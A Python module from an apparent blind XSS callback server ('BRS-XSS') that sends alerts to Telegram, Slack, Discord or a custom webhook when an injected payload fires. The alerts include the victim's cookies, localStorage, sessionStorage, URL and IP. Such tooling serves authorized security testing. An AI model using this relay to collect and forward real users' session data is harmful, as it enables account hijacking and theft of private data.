#!/usr/bin/env python3

"""
Project: BRS-XSS Blind XSS Callback Server
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: Wed 25 Dec 2025 12:30:00 UTC
Status: Created
Telegram: https://t.me/EasyProTech

Webhook notifications for Blind XSS callbacks.
Supports Telegram, Slack, Discord, and custom webhooks.
"""

import httpx
from typing import Optional, Dict, Any

from .models import Callback, WebhookConfig


class NotificationManager:
    """Manages webhook notifications for Blind XSS callbacks"""

    def __init__(self, config: WebhookConfig):
        self.config = config
        self._client: Optional[httpx.AsyncClient] = None

    async def _get_client(self) -> httpx.AsyncClient:
        """Get or create HTTP client"""
        if self._client is None or self._client.is_closed:
            self._client = httpx.AsyncClient(timeout=10.0)
        return self._client

    async def close(self):
        """Close HTTP client"""
        if self._client and not self._client.is_closed:
            await self._client.aclose()

    async def notify_callback(self, callback: Callback) -> bool:
        """Send notification for new callback"""
        if not self.config.enabled or not self.config.notify_on_new_callback:
            return False

        success = True

        # Telegram
        if self.config.telegram_bot_token and self.config.telegram_chat_id:
            telegram_ok = await self._send_telegram(callback)
            success = success and telegram_ok

        # Slack
        if self.config.slack_webhook_url:
            slack_ok = await self._send_slack(callback)
            success = success and slack_ok

        # Discord
        if self.config.discord_webhook_url:
            discord_ok = await self._send_discord(callback)
            success = success and discord_ok

        # Custom webhook
        if self.config.custom_webhook_url:
            custom_ok = await self._send_custom(callback)
            success = success and custom_ok

        return success

    async def _send_telegram(self, callback: Callback) -> bool:
        """Send Telegram notification"""
        try:
            client = await self._get_client()

            message = self._format_telegram_message(callback)
            url = f"https://api.telegram.org/bot{self.config.telegram_bot_token}/sendMessage"

            response = await client.post(
                url,
                json={
                    "chat_id": self.config.telegram_chat_id,
                    "text": message,
                    "parse_mode": "HTML",
                },
            )

            return response.status_code == 200

        except Exception:
            return False

    async def _send_slack(self, callback: Callback) -> bool:
        """Send Slack notification"""
        try:
            client = await self._get_client()

            payload = self._format_slack_message(callback)
            response = await client.post(self.config.slack_webhook_url, json=payload)

            return response.status_code == 200

        except Exception:
            return False

    async def _send_discord(self, callback: Callback) -> bool:
        """Send Discord notification"""
        try:
            client = await self._get_client()

            payload = self._format_discord_message(callback)
            response = await client.post(self.config.discord_webhook_url, json=payload)

            return response.status_code in [200, 204]

        except Exception:
            return False

    async def _send_custom(self, callback: Callback) -> bool:
        """Send to custom webhook"""
        try:
            client = await self._get_client()

            payload = self._format_custom_payload(callback)
            response = await client.post(self.config.custom_webhook_url, json=payload)

            return response.status_code < 400

        except Exception:
            return False

    def _format_telegram_message(self, callback: Callback) -> str:
        """Format message for Telegram"""
        lines = [
            "<b>🎯 Blind XSS Triggered!</b>",
            "",
            f"<b>Payload ID:</b> <code>{callback.payload_id}</code>",
            f"<b>Source IP:</b> <code>{callback.source_ip}</code>",
            f"<b>Time:</b> {callback.received_at.strftime('%Y-%m-%d %H:%M:%S')} UTC",
        ]

        if callback.url:
            lines.append(f"<b>URL:</b> {callback.url[:100]}")

        if callback.referer:
            lines.append(f"<b>Referer:</b> {callback.referer[:100]}")

        if callback.payload_info:
            lines.extend(
                [
                    "",
                    "<b>Payload Info:</b>",
                    f"  Target: {callback.payload_info.target_url[:80]}",
                    f"  Parameter: {callback.payload_info.parameter}",
                ]
            )

        if callback.cookies:
            lines.append(f"\n<b>Cookies:</b> <code>{callback.cookies[:200]}...</code>")

        return "\n".join(lines)

    def _format_slack_message(self, callback: Callback) -> Dict[str, Any]:
        """Format message for Slack"""
        blocks = [
            {
                "type": "header",
                "text": {
                    "type": "plain_text",
                    "text": "🎯 Blind XSS Triggered!",
                    "emoji": True,
                },
            },
            {
                "type": "section",
                "fields": [
                    {
                        "type": "mrkdwn",
                        "text": f"*Payload ID:*\n`{callback.payload_id}`",
                    },
                    {"type": "mrkdwn", "text": f"*Source IP:*\n`{callback.source_ip}`"},
                    {
                        "type": "mrkdwn",
                        "text": f"*Time:*\n{callback.received_at.strftime('%Y-%m-%d %H:%M:%S')} UTC",
                    },
                ],
            },
        ]

        if callback.url:
            blocks.append(
                {
                    "type": "section",
                    "text": {"type": "mrkdwn", "text": f"*URL:* {callback.url[:200]}"},
                }
            )

        if callback.cookies:
            blocks.append(
                {
                    "type": "section",
                    "text": {
                        "type": "mrkdwn",
                        "text": f"*Cookies:*\n```{callback.cookies[:500]}```",
                    },
                }
            )

        return {"blocks": blocks}

    def _format_discord_message(self, callback: Callback) -> Dict[str, Any]:
        """Format message for Discord"""
        embed = {
            "title": "🎯 Blind XSS Triggered!",
            "color": 0xFF0000,  # Red
            "timestamp": callback.received_at.isoformat(),
            "fields": [
                {
                    "name": "Payload ID",
                    "value": f"`{callback.payload_id}`",
                    "inline": True,
                },
                {
                    "name": "Source IP",
                    "value": f"`{callback.source_ip}`",
                    "inline": True,
                },
            ],
        }

        if callback.url:
            embed["fields"].append(
                {"name": "URL", "value": callback.url[:200], "inline": False}
            )

        if callback.referer:
            embed["fields"].append(
                {"name": "Referer", "value": callback.referer[:200], "inline": False}
            )

        if callback.cookies:
            embed["fields"].append(
                {
                    "name": "Cookies",
                    "value": f"```{callback.cookies[:500]}```",
                    "inline": False,
                }
            )

        return {"embeds": [embed]}

    def _format_custom_payload(self, callback: Callback) -> Dict[str, Any]:
        """Format payload for custom webhook"""
        return {
            "event": "blind_xss_callback",
            "timestamp": callback.received_at.isoformat(),
            "data": {
                "callback_id": callback.id,
                "payload_id": callback.payload_id,
                "source_ip": callback.source_ip,
                "user_agent": callback.user_agent,
                "referer": callback.referer,
                "url": callback.url,
                "cookies": callback.cookies,
                "local_storage": callback.local_storage,
                "session_storage": callback.session_storage,
                "has_dom_snapshot": bool(callback.dom_snapshot),
                "has_screenshot": bool(callback.screenshot_path),
                "custom_data": callback.custom_data,
            },
            "payload_info": (
                {
                    "payload": (
                        callback.payload_info.payload if callback.payload_info else None
                    ),
                    "target_url": (
                        callback.payload_info.target_url
                        if callback.payload_info
                        else None
                    ),
                    "parameter": (
                        callback.payload_info.parameter
                        if callback.payload_info
                        else None
                    ),
                }
                if callback.payload_info
                else None
            ),
        }
